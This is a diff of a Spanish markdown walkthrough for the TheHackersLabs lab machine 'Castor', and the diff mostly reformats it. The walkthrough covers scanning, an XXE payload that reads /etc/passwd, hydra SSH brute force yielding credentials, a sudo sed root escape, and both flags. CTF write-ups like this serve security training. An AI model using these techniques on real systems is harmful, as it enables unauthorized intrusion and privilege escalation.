@@ -1,108 +1,131 @@
-# Castor - TheHackersLabs
+# **Rearme.md | Castor - TheHackersLabs**
 
-## Información General
+---
+
+## **Información General**
 
 - **Plataforma:** TheHackersLabs
 - **Nombre:** Castor
-- **IP:** 192.168.80.73
+- **IP:** `192.168.80.73`
 - **Dificultad:** Easy/Medium
 - **Sistema Operativo:** Debian Linux
 - **Objetivo:** Obtener acceso root
 
 ---
 
-# Reconocimiento
+---
 
-## Descubrimiento de hosts
+## **Reconocimiento**
 
-Primero se identificaron los equipos activos en la red local usando `arp-scan`:
+### **Descubrimiento de hosts**
+
+Se identificaron los equipos activos en la red local con `arp-scan`:
 
 ```bash
 arp-scan -I eth0 --localnet
+```
 
-Resultado:
+**Resultado:**
+```
 192.168.80.73   08:00:27:0b:9c:e9       PCS Systemtechnik GmbH
 ```
 
-## Modo PRO
+---
 
+### **Modo PRO**
+
+#### **Escaneo básico en un rango específico:**
 ```bash
-# Escaneo básico en un rango específico:
 sudo netdiscover -i eth0 -r 192.168.1.0/24
+```
 
-# Escaneo pasivo (solo escucha, no envía paquetes):
+#### **Escaneo pasivo (solo escucha):**
+```bash
 sudo netdiscover -i wlan0 -p
+```
 
-# Escaneo automático (revisa los rangos locales comunes):
+#### **Escaneo automático (rangos locales comunes):**
+```bash
 sudo netdiscover
 ```
 
-Posteriormente se confirmó con `nmap`:
+---
+
+### **Confirmación con Nmap**
 
 ```bash
 nmap -sn 192.168.80.0/24
+```
 
-Hosts detectados:
+**Hosts detectados:**
 - Router
 - iPhone
-- Máquina víctima: TheHackersLabs-Castor
-```
+- Máquina víctima: **TheHackersLabs-Castor**
 
-## Escaneo de Puertos
+---
 
-**Escaneo TCP completo**
+## **Escaneo de Puertos**
 
+### **Escaneo TCP completo**
 ```bash
 nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.80.73 -oN Escaneo_TCP
-
-Puertos abiertos:
-Puerto   Servicio
-22       SSH
-80       HTTP
 ```
 
-**Detección de servicios**
+**Puertos abiertos:**
+| Puerto | Servicio |
+|--------|----------|
+| 22     | SSH      |
+| 80     | HTTP     |
 
+---
+
+### **Detección de servicios**
 ```bash
 nmap -sCV -p22,80 192.168.80.73
+```
 
-Resultado:
+**Resultado:**
+```
 22/tcp open  ssh     OpenSSH 9.2p1 Debian
 80/tcp open  http    Apache httpd 2.4.62
 ```
 
-## Título web:
+---
+
+## **Enumeración Web**
+
+### **Título web:**
 **CastorTech | Madera Sostenible**
 
-## Enumeración Web | Fuzzing de directorios
+---
 
-Se utilizó **Gobuster**:
-
+### **Fuzzing de directorios con Gobuster**
 ```bash
 gobuster dir -u http://192.168.80.73/ \
 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt \
 -x php,html,txt
-
-Resultados relevantes:
-- /uploads
-- /upload.php
-- /server-status
 ```
 
-## Análisis de upload.php
+**Resultados relevantes:**
+- `/uploads`
+- `/upload.php`
+- `/server-status`
 
-Se probaron peticiones POST simples:
+---
 
+### **Análisis de `upload.php`**
+
+#### **Prueba básica con `curl`:**
 ```bash
 curl -X POST http://192.168.80.73/upload.php -d "test=hola"
 ```
+**Respuesta:** Sugirió procesamiento XML.
 
-La respuesta sugirió procesamiento XML.
+---
 
-## Prueba XXE
+### **Explotación XXE**
 
-Se creó un archivo `test.xml`:
-
+#### **Archivo `test.xml`:**
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
@@ -113,27 +136,27 @@ Se creó un archivo `test.xml`:
 </root>
 ```
 
-Petición:
-
+#### **Petición con `curl`:**
 ```bash
 curl -X POST http://192.168.80.73/upload.php \
 -H "Content-Type: application/xml" \
 --data-binary @test.xml
 ```
 
-La respuesta mostró contenido de `/etc/passwd`.
+**Resultado:** Se obtuvo el contenido de `/etc/passwd`.
 
-**Usuario identificado:**
-```
+---
+
+### **Usuario identificado**
+```bash
 castorcin:x:1001:1001:castorcin,,,:/home/castorcin:/bin/bash
 ```
 
-# Acceso Inicial
+---
 
-## Fuerza bruta SSH
+## **Acceso Inicial**
 
-Se utilizó **Hydra**:
-
+### **Fuerza bruta SSH con Hydra**
 ```bash
 hydra -t 4 -vV \
 -L user.txt \
@@ -142,19 +165,19 @@ hydra -t 4 -vV \
 ```
 
 **Credenciales encontradas:**
-```
-Usuario: castorcin
-Password: chocolate
-```
+- **Usuario:** `castorcin`
+- **Password:** `chocolate`
 
-## Acceso SSH
+---
 
+### **Acceso SSH**
 ```bash
 ssh castorcin@192.168.80.73
 ```
 
-## Obtención de flag de usuario:
+---
 
+### **Obtención de flag de usuario**
 ```bash
 cat user.txt
 ```
@@ -164,10 +187,11 @@ cat user.txt
 THL{JDBNASJNAdnnasdkasdaCastorcito}
 ```
 
-# Escalada de Privilegios
+---
 
-## Enumeración sudo
+## **Escalada de Privilegios**
 
+### **Enumeración de `sudo`**
 ```bash
 sudo -l
 ```
@@ -177,40 +201,31 @@ sudo -l
 (ALL : ALL) NOPASSWD: /usr/bin/sed
 ```
 
-## Explotación de sed
+---
 
+### **Explotación de `sed`**
 Se aprovechó el binario permitido para obtener shell root:
-
 ```bash
 sudo sed -n '1e exec sh 1>&0' /etc/hosts
 ```
 
+**Shell root obtenida:**
 ```bash
 whoami
-root
+# root
 ```
 
-# Captura de Flags
+---
 
-## Root Flag
+## **Captura de Flags**
 
+### **Root Flag**
 ```bash
 cd /root
 cat root.txt
 ```
 
-**Flag Root:**
+**Flag:**
 ```
 THL{asdmaskdmasdkCASTOR}
 ```
-
----
-
-## Resumen del ataque
-
-1. **Reconocimiento** → `arp-scan`, `nmap`
-2. **Enumeración web** → `gobuster` descubre `/upload.php`
-3. **XXE** → Lectura de `/etc/passwd` revela usuario `castorcin`
-4. **Fuerza bruta SSH** → `hydra` obtiene credenciales `castorcin:chocolate`
-5. **Escalada de privilegios** → `sudo sed` permite ejecución de comandos como root
-6. **Flags obtenidas** → User: `THL{JDBNASJNAdnnasdkasdaCastorcito}` | Root: `THL{asdmaskdmasdkCASTOR}`
